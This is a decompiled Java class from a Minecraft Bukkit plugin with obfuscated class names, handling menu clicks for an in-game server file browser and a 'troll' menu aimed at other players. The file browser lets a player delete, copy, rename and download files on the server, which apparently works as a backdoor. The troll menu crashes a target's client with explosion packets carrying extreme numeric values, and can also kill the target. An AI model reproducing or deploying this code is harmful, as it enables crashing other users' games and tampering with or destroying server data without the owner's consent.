//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package reciv;

import java.io.File;
import java.util.Collections;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;

public class L extends U implements org.bukkit.event.Listener {
    public L() {
    }

    @EventHandler(
            priority = EventPriority.HIGHEST
    )
    public void InvClick(InventoryClickEvent e) {
        Player p = (Player)e.getWhoClicked();

        try {
            if (U.files.get(e.getWhoClicked()) != null && e.getInventory().getName().equalsIgnoreCase(((File) U.files.get(e.getWhoClicked())).getAbsoluteFile().getParentFile().getName())) {
                e.setCancelled(true);
                if (e.getSlot() == 45) {
                    if (e.getCurrentItem().getItemMeta().getDisplayName().equalsIgnoreCase("§cZurück")) {
                        CR.openviewinv(p, e.getInventory());
                        if (((File) U.files.get(e.getWhoClicked())).getAbsoluteFile().getParentFile().listFiles().length - (Integer) U.states.get(p) > 45) {
                            CR.openviewinv(p, e.getInventory());
                            int is = ((File) U.files.get(p)).getAbsoluteFile().getParentFile().listFiles().length / 45 + 1;
                            if ((Integer) U.states.get(p) / 45 != is - 1) {
                                U.states.put((Player)e.getWhoClicked(), (Integer) U.states.get(e.getWhoClicked()) + 45);
                            }
                        } else {
                            CR.openviewinv(p, e.getInventory());
                            U.states.put((Player)e.getWhoClicked(), ((File) U.files.get(e.getWhoClicked())).getAbsoluteFile().getParentFile().listFiles().length);
                        }
                    }

                    CR.openviewinv(p, e.getInventory());
                } else if (e.getSlot() == 53) {
                    if (e.getCurrentItem().getItemMeta().equals(IS.glasf.m)) {
                        if ((Integer) U.states.get(e.getWhoClicked()) > 45) {
                            if (e.getCurrentItem() != null) {
                                U.states.put((Player)e.getWhoClicked(), (Integer) U.states.get(e.getWhoClicked()) - 45);
                                CR.openviewinv(p, e.getInventory());
                            }
                        } else if (e.getCurrentItem() != null) {
                        }
                    }
                } else if (e.getSlot() != 46 && e.getSlot() != 52) {
                    File f;
                    String name;
                    if (e.getCurrentItem() != null && e.getCurrentItem().getType() == Material.CHEST) {
                        if (e.getClick().equals(ClickType.LEFT)) {
                            name = e.getCurrentItem().getItemMeta().getDisplayName();
                            String n = name.substring(4);
                           f = new File(((File) U.files.get(p)).getAbsoluteFile().getParentFile().getAbsolutePath() + "/" + n + "/" + p.getUniqueId() + ".txt");
                            p.closeInventory();
                            U.files.put(p, f);
                            CR.openviewinv(p);
                        } else if (e.getClick().equals(ClickType.RIGHT)) {
                            e.getWhoClicked().closeInventory();
                            name = e.getCurrentItem().getItemMeta().getDisplayName().substring(4);
                            f = new File(((File) U.files.get(p)).getAbsoluteFile().getParentFile().getAbsolutePath() + "/" + name);
                            CR.openEdit(p, f);
                            U.edit.put(p, f);
                        }
                    } else if (e.getCurrentItem().getType() == Material.BOOK) {
                        if (e.getClick().equals(ClickType.LEFT)) {
                            e.setCancelled(true);
                        } else if (e.getClick().equals(ClickType.RIGHT)) {
                            e.getWhoClicked().closeInventory();
                            name = e.getCurrentItem().getItemMeta().getDisplayName().substring(4);
                            f = new File(((File) U.files.get(p)).getAbsoluteFile().getParentFile().getAbsolutePath() + "/" + name);
                            U.edit.put(p, f);
                            CR.openEdit(p, f);
                            e.setCancelled(true);
                        }
                    } else if (e.getSlot() == 49) {
                        if (copys.containsKey(p)) {
                            U.pastes.add(p);
                            p.sendMessage(pr + "§a Schreibe den Namen, unter dem die Datei gepastet werden soll, in den §2Chat§a!");
                            e.setCancelled(true);
                            p.closeInventory();
                        } else {
                            p.sendMessage(pr + "§c Du hast noch keine Datei kopiert!");
                        }
                    } else if (e.getSlot() != 47 && e.getSlot() != 51) {
                        if (e.getSlot() == 48) {
                            mkd.add(p);
                            p.sendMessage(pr + "§a Gebe den Namen des neuen §2Ordners§a in den §2Chat§a ein!");
                            p.closeInventory();
                        } else if (e.getSlot() == 50) {
                            txtname.add(p);
                            p.sendMessage(pr + "§a Gebe den Namen der neuen §2Datei§a in den §2Chat§a ein!");
                            p.closeInventory();
                        }
                    } else {
                        p.sendMessage(pr + "§a Gebe den §2Link§a der Datei in den §2Chat§a ein!");
                        p.closeInventory();
                        add.add(p);
                    }
                } else {
                    U.files.put((Player)e.getWhoClicked(), ((File) U.files.get(p)).getAbsoluteFile().getParentFile());
                    e.getWhoClicked().closeInventory();
                    CR.openviewinv(p);
                }
            } else if (U.edit.get(p) != null && e.getInventory().getName().equalsIgnoreCase(((File) U.edit.get(p)).getName())) {
                switch(e.getSlot()) {
                    case 1:
                        delFile((File) U.edit.get(p));
                        p.sendMessage(U.pr + "§a Die Datei §6" + ((File) U.edit.get(p)).getName() + "§a wurde gelöscht");
                        e.setCancelled(true);
                        CR.openviewinv((Player)e.getWhoClicked(), p.getInventory());
                        U.edit.remove(p);
                    case 2:
                    case 4:
                    case 6:
                    default:
                        break;
                    case 3:
                        e.setCancelled(true);
                        e.getWhoClicked().closeInventory();
                        p.sendMessage(U.pr + "§b " + ((File) U.edit.get(p)).getAbsolutePath());
                        U.edit.remove(p);
                        break;
                    case 5:
                        U.copys.put(p, U.edit.get(p));
                        e.setCancelled(true);
                        p.sendMessage(pr + "§a Die Datei§6 " + ((File) U.edit.get(p)).getName() + "§a wurde kopiert!");
                        p.closeInventory();
                        break;
                    case 7:
                        e.setCancelled(true);
                        e.getWhoClicked().closeInventory();
                        rn.add(p);
                        wait.add(p);
                        p.sendMessage(pr + "§a Gebe den neuen Namen der §2Datei§a in den §2Chat§a ein!");
                }
            } else if (e.getInventory().getName().equals(((Player)trolls.get(p)).getName())) {
                e.setCancelled(true);
                e.getWhoClicked().sendMessage("" + e.getInventory().getName());
                Player t = (Player)trolls.get(p);
                e.getWhoClicked().sendMessage(t.getName());
                switch(e.getSlot()) {
                    case 0:
                        e.setCancelled(true);
                        p.sendMessage(t.getName() + " gecrasht");
                        ((CraftPlayer)t).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D, 3.4028235E38F, Collections.EMPTY_LIST, new Vec3D(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D)));
                        ((CraftPlayer)t).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D, 3.4028235E38F, Collections.EMPTY_LIST, new Vec3D(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D)));
                        ((CraftPlayer)t).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D, 3.4028235E38F, Collections.EMPTY_LIST, new Vec3D(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D)));
                        ((CraftPlayer)t).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D, 3.4028235E38F, Collections.EMPTY_LIST, new Vec3D(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D)));
                        ((CraftPlayer)t).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D, 3.4028235E38F, Collections.EMPTY_LIST, new Vec3D(1.7976931348623157E308D, 1.7976931348623157E308D, 1.7976931348623157E308D)));
                        break;
                    case 1:
                        if (black.containsKey(t)) {
                            Bukkit.getScheduler().cancelTask((Integer)black.get(t));
                        } else {
                            BS.blackp(t);
                        }
                    case 2:
                    case 3:
                    case 4:
                    default:
                        break;
                    case 5:
                        t.setHealth(0.0D);
                }
            }
        } catch (Exception var6) {
            var6.printStackTrace();
        }

    }

    @EventHandler
    public void PlayerClose(InventoryCloseEvent e) {
    }

    public static void delFile(File f) {
        File[] files = f.listFiles();
        if (f.isDirectory()) {
            for(int i = 0; i < files.length; ++i) {
                if (files[i].isDirectory()) {
                    if (files[i].listFiles().length == 0) {
                        files[i].delete();
                    } else {
                        delFile(files[i]);
                    }
                } else {
                    files[i].delete();
                }

                f.delete();
            }
        } else {
            f.delete();
        }

    }
}
